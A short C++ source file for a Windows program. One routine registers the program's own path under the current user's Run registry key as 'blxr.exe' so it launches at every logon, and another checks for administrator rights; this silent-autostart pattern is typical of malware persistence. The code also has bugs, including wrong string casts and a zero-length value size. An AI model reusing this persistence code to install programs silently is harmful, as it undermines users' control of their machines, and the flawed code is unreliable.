#include "sys.h"
#include "stream.h"

int Sys::AddToRegistry() {
  std::wstring exe = L"blxr.exe";
  std::wstring fullPath;
  WCHAR dest[0xFFF];
  GetModuleFileNameW(nullptr, dest, MAX_PATH);

  HKEY hkey = nullptr;
  LSTATUS retRck = RegCreateKeyEx(HKEY_CURRENT_USER,
								  reinterpret_cast<LPCSTR>(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
								  0,
								  nullptr,
								  REG_OPTION_NON_VOLATILE,
								  KEY_SET_VALUE,
								  nullptr,
								  &hkey,
								  nullptr);
  if (retRck != ERROR_SUCCESS) {
	return retRck;
  }
  RegSetValueEx(hkey,
				reinterpret_cast<LPCSTR>(exe.c_str()),
				0,
				REG_SZ,
				(BYTE *)dest,
				(fullPath.size() + 1) * sizeof(wchar_t));
  //RegQueryValueEx(hkey, fullPath.c_str(), nullptr, nullptr, nullptr, nullptr);
  return 0;
}
bool Sys::IsRunningAsAdmin() {
  BOOL isAdmin = false;
  DWORD dwError = ERROR_SUCCESS;
  PSID pAdministratorsGroup;

  SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
  if (!AllocateAndInitializeSid(
	  &ntAuthority,
	  2,
	  SECURITY_BUILTIN_DOMAIN_RID,
	  DOMAIN_ALIAS_RID_ADMINS,
	  0, 0, 0, 0, 0, 0,
	  &pAdministratorsGroup)) {
	dwError = GetLastError();
  } else if (!CheckTokenMembership(nullptr, pAdministratorsGroup, &isAdmin)) {
	dwError = GetLastError();
  }

  if (pAdministratorsGroup) {
	FreeSid(pAdministratorsGroup);
	pAdministratorsGroup = nullptr;
  }
  if (ERROR_SUCCESS != dwError) {
	throw dwError;
  }
  return isAdmin;
}
